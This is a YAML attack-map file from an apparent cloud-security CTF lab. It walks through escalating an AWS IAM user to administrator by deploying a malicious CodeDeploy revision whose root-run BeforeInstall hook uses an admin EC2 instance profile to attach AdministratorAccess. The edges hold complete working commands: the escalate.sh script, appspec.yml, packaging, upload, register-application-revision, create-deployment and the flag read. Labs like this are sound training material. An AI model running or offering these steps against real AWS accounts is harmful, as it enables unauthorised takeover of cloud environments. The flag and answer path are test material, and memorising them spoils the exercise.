attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-codedeploy-001-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has codedeploy:CreateDeployment (and related helper permissions)
        on all resources in the account, which is enough to deploy a malicious revision
        to any CodeDeploy deployment group — including those targeting EC2 instances with
        privileged instance profiles.

    - id: attacker-bucket
      label: "Attacker Revision Bucket"
      type: resource
      subType: s3-bucket
      isAttackerControlled: true
      arn: "arn:aws:s3:::pl-attacker-codedeploy-001-revision-{account_id}"
      description: >
        This S3 bucket is attacker-controlled infrastructure, not a victim misconfiguration.
        The attacker stages a malicious revision ZIP here before triggering the deployment.
        The ZIP contains an appspec.yml that declares a BeforeInstall lifecycle hook pointing
        to a shell script (scripts/escalate.sh). The bucket policy grants the victim account
        and the CodeDeploy service principal s3:GetObject access so the CodeDeploy agent on
        the target instance can download the revision at deployment time.

    - id: deployment-group
      label: "CodeDeploy Deployment Group"
      type: resource
      subType: codedeploy-deployment-group
      arn: "arn:aws:codedeploy:{region}:{account_id}:deploymentgroup:pl-prod-codedeploy-001-to-admin-app/pl-prod-codedeploy-001-to-admin-dg"
      description: >
        This CodeDeploy deployment group targets the privileged EC2 instance. When a
        deployment is triggered, the CodeDeploy service downloads the revision from
        the specified S3 location and instructs the CodeDeploy agent running on each
        target instance to execute the lifecycle hooks defined in appspec.yml.

    - id: ec2-role
      label: "Admin EC2 Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-codedeploy-001-to-admin-ec2-role"
      description: >
        This IAM role has AdministratorAccess and is attached to the target EC2 instance
        via an instance profile. The CodeDeploy agent executes lifecycle hook scripts as
        root on the instance, meaning those scripts run under this role's credentials via
        the Instance Metadata Service. The malicious escalate.sh hook uses these admin
        credentials to call iam:AttachUserPolicy, attaching the AWS-managed
        AdministratorAccess policy to the starting user — completing the privilege
        escalation without any iam:PassRole or ssm:SendCommand involvement.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/codedeploy-001-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM Parameter Store parameter.
        After the lifecycle hook executes, the starting IAM user has AdministratorAccess
        attached (which includes ssm:GetParameter). Use the starting user's original
        credentials to retrieve the flag — the same credentials you started with, now
        with full administrator access to the account.

  edges:
    - from: starting-principal
      to: attacker-bucket
      label: "Stage malicious revision"
      description: >
        Before triggering the deployment, the attacker uploads a malicious revision ZIP
        to their controlled S3 bucket. The ZIP contains an appspec.yml declaring a
        BeforeInstall lifecycle hook and a shell script (scripts/escalate.sh) that uses
        the EC2 instance profile credentials to call iam:AttachUserPolicy on the starting
        user, attaching the AdministratorAccess managed policy. The attacker also reads
        the target user name from an SSM parameter (/pl/codedeploy-001/target-user)
        that was pre-populated by Terraform.
      hints:
        - "The revision is a ZIP file containing two things: an appspec.yml at the root that declares a BeforeInstall hook, and the hook script at scripts/escalate.sh. The hook script will run as root on the EC2 instance under the instance profile's credentials — write it to call iam:AttachUserPolicy on the starting IAM user to attach the AdministratorAccess managed policy (arn:aws:iam::aws:policy/AdministratorAccess)."
        - "The attacker S3 bucket already exists with the correct bucket policy (Terraform pre-staged it). Upload the revision ZIP with aws s3 cp, then proceed to register and trigger the deployment."
        - "Browse to https://pathfinding.cloud/paths/codedeploy-001 for full technique details."
      commands:
        - description: "Create the escalate.sh lifecycle hook script"
          command: |
            cat > scripts/escalate.sh << 'EOF'
            #!/bin/bash
            set -e
            REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
            TARGET_USER=$(aws ssm get-parameter --name /pl/codedeploy-001/target-user --region "$REGION" --query Parameter.Value --output text)
            aws iam attach-user-policy --user-name "$TARGET_USER" --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
            EOF
            chmod +x scripts/escalate.sh
        - description: "Create the appspec.yml"
          command: |
            cat > appspec.yml << 'EOF'
            version: 0.0
            os: linux
            hooks:
              BeforeInstall:
                - location: scripts/escalate.sh
                  timeout: 300
                  runas: root
            EOF
        - description: "Package the revision into a ZIP"
          command: "zip -r malicious-revision.zip appspec.yml scripts/"
        - description: "Upload the malicious revision to the attacker-controlled bucket"
          command: "aws s3 cp malicious-revision.zip s3://pl-attacker-codedeploy-001-revision-{account_id}/revision.zip"

    - from: attacker-bucket
      to: deployment-group
      label: "codedeploy:CreateDeployment"
      description: >
        The attacker calls codedeploy:CreateDeployment targeting the pre-existing
        deployment group, pointing the revision at the malicious ZIP in the attacker
        S3 bucket. The CodeDeploy service accepts the deployment request because the
        starting user has the required permissions, then orchestrates the agent on the
        target EC2 instance to download and execute the revision.
      hints:
        - "Register the revision first with codedeploy:RegisterApplicationRevision (required before CreateDeployment can reference it), then call codedeploy:CreateDeployment with the --revision flag pointing to the attacker S3 bucket and key. Use --ignore-application-stop-failures and --file-exists-behavior OVERWRITE to avoid failures on a clean instance."
        - "After triggering the deployment, poll codedeploy:GetDeployment until status reaches Succeeded. The CodeDeploy agent needs about 5 minutes after the EC2 instance starts to become ready -- if the deployment fails immediately, wait and retry."
      commands:
        - description: "Register the malicious revision with CodeDeploy"
          command: "aws deploy register-application-revision --application-name pl-prod-codedeploy-001-to-admin-app --s3-location bucket=pl-attacker-codedeploy-001-revision-{account_id},key=revision.zip,bundleType=zip --region {region}"
        - description: "Trigger the deployment pointing at the attacker-controlled revision"
          command: "aws deploy create-deployment --application-name pl-prod-codedeploy-001-to-admin-app --deployment-group-name pl-prod-codedeploy-001-to-admin-dg --revision '{\"revisionType\":\"S3\",\"s3Location\":{\"bucket\":\"pl-attacker-codedeploy-001-revision-{account_id}\",\"key\":\"revision.zip\",\"bundleType\":\"zip\"}}' --ignore-application-stop-failures --file-exists-behavior OVERWRITE --region {region}"
        - description: "Poll deployment status until Succeeded"
          command: "aws deploy get-deployment --deployment-id <deployment-id> --query 'deploymentInfo.status' --output text --region {region}"

    - from: deployment-group
      to: ec2-role
      label: "Agent executes hook as instance profile"
      description: >
        Once the deployment is triggered, the CodeDeploy agent on the target EC2 instance
        downloads the revision ZIP from the attacker S3 bucket and executes the BeforeInstall
        lifecycle hook (scripts/escalate.sh) as root. The script runs under the EC2 instance
        profile credentials — the admin role pl-prod-codedeploy-001-to-admin-ec2-role — and
        calls iam:AttachUserPolicy to attach the AdministratorAccess managed policy to the
        starting IAM user. No iam:PassRole, no ssm:SendCommand; the deployment channel
        provides code execution under the privileged instance profile.
      hints: []
      commands: []

    - from: ec2-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        After the deployment succeeds, the starting user has AdministratorAccess attached
        (via iam:AttachUserPolicy run as the admin EC2 role). Wait ~15 seconds for IAM
        policy propagation, then use the original starting user credentials to read the
        CTF flag from SSM Parameter Store. The execution path that attached
        AdministratorAccess ran entirely as pl-prod-codedeploy-001-to-admin-ec2-role,
        making that role the effective admin pivot in the attack graph.
      hints:
        - "After the deployment succeeds, allow 15 seconds for IAM propagation, then switch back to the starting user credentials and call ssm:GetParameter on the flag path. The AdministratorAccess policy now attached to the starting user grants ssm:GetParameter — no credential rotation needed."
      commands:
        - description: "Wait for IAM managed policy attachment propagation"
          command: "sleep 15"
        - description: "Read the CTF flag using the starting user credentials (now with AdministratorAccess)"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/codedeploy-001-to-admin --query 'Parameter.Value' --output text"
